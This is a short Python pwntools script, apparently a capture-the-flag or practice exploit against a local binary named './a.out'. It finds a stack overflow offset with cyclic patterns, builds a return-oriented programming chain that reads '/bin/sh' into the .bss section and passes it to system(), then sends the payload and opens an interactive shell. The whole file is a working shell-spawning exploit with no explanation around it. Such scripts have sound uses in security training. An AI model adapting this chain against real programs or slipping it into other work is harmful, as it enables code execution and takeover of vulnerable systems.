from pwn import *

binary = './a.out'
p = process(binary)

padding = cyclic(cyclic_find('baab'))
elf = ELF(binary)
addr_bss = elf.bss()
cmd = "/bin/sh\x00"

rop = ROP(elf)
rop.read(0, addr_bss, len(cmd))
rop.system(addr_bss)

print rop.dump()

p.sendline(padding + str(rop))
p.send(cmd)

p.interactive()
